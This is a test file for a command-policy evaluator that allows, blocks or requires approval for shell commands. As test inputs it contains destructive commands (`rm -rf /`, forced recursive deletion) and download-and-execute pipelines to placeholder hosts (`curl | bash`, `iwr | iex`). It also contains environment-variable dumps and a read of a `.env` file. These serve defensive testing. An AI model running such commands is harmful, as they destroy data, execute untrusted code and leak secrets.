import { describe, expect, it } from "vitest";
import { evaluatePolicy } from "./policies";

describe("evaluatePolicy", () => {
  it("allows known dev commands", () => {
    expect(evaluatePolicy({ command: "git", args: ["status"] }).allowed).toBe(true);
    expect(evaluatePolicy({ command: "npm", args: ["test"] }).allowed).toBe(true);
    expect(evaluatePolicy({ command: "gh", args: ["auth", "status"] }).allowed).toBe(true);
  });

  it("blocks rm -rf even if approved", () => {
    const d = evaluatePolicy({ command: "rm", args: ["-rf", "/"], approved: true });
    expect(d.allowed).toBe(false);
    expect(d.requiresApproval).toBe(false);
  });

  it("blocks bash/sh shell (not on allowlist)", () => {
    const d = evaluatePolicy({ command: "bash", args: ["-c", "curl x | bash"] });
    expect(d.allowed).toBe(false);
  });

  it("npm curl|sh body matches approval pattern", () => {
    // Hypothetical: npm script that pipes curl through bash. Allowlisted base, approval required.
    const d = evaluatePolicy({ command: "npm", args: ["exec", "--", "curl http://x.sh | bash"] });
    expect(d.allowed).toBe(false);
    expect(d.requiresApproval).toBe(true);
  });

  it("npm curl|sh body allowed when approved", () => {
    const d = evaluatePolicy({
      command: "npm",
      args: ["exec", "--", "curl http://x.sh | bash"],
      approved: true,
    });
    expect(d.allowed).toBe(true);
  });

  it("rejects unknown commands", () => {
    const d = evaluatePolicy({ command: "unknownbinary", args: [] });
    expect(d.allowed).toBe(false);
    expect(d.requiresApproval).toBe(false);
  });

  it("requires approval for global npm install", () => {
    const d = evaluatePolicy({ command: "npm", args: ["install", "-g", "foo"] });
    expect(d.allowed).toBe(false);
    expect(d.requiresApproval).toBe(true);
  });

  it("allows global install when approved", () => {
    const d = evaluatePolicy({ command: "npm", args: ["install", "-g", "foo"], approved: true });
    expect(d.allowed).toBe(true);
  });

  it("blocks env dump", () => {
    expect(evaluatePolicy({ command: "node", args: ["-e", "printenv"] }).allowed).toBe(false);
  });

  it("blocks node -e even if approved", () => {
    const d = evaluatePolicy({ command: "node", args: ["-e", "console.log(process.env)"], approved: true });
    expect(d.allowed).toBe(false);
    expect(d.requiresApproval).toBe(false);
  });

  it("blocks python -c even if approved", () => {
    const d = evaluatePolicy({ command: "python", args: ["-c", "import os; print(os.environ)"], approved: true });
    expect(d.allowed).toBe(false);
    expect(d.requiresApproval).toBe(false);
  });

  it("blocks reading .env file", () => {
    expect(evaluatePolicy({ command: "node", args: ["-e", "cat .env"] }).allowed).toBe(false);
  });

  it("blocks Remove-Item -Recurse -Force even if approved", () => {
    const d = evaluatePolicy({
      command: "pwsh",
      args: ["-c", "Remove-Item C:\\stuff -Recurse -Force"],
      approved: true,
    });
    expect(d.allowed).toBe(false);
  });

  it("allows git status / log / shortlog", () => {
    expect(evaluatePolicy({ command: "git", args: ["log", "--oneline"] }).allowed).toBe(true);
    expect(evaluatePolicy({ command: "git", args: ["shortlog", "-sn"] }).allowed).toBe(true);
  });

  it("blocks PowerShell iwr|iex download-execute unconditionally", () => {
    const d = evaluatePolicy({ command: "pwsh", args: ["-c", "iwr https://x | iex"], approved: true });
    expect(d.allowed).toBe(false);
    expect(d.requiresApproval).toBe(false);
  });

  it("blocks Invoke-Expression unconditionally", () => {
    const d = evaluatePolicy({
      command: "pwsh",
      args: ["-c", "Invoke-Expression 'rm -rf /'"],
      approved: true,
    });
    expect(d.allowed).toBe(false);
    expect(d.requiresApproval).toBe(false);
  });

  it("requires approval for arbitrary npx packages", () => {
    const d = evaluatePolicy({ command: "npx", args: ["some-random-package"] });
    expect(d.allowed).toBe(false);
    expect(d.requiresApproval).toBe(true);
    expect(evaluatePolicy({ command: "npx", args: ["some-random-package"], approved: true }).allowed).toBe(true);
  });
});
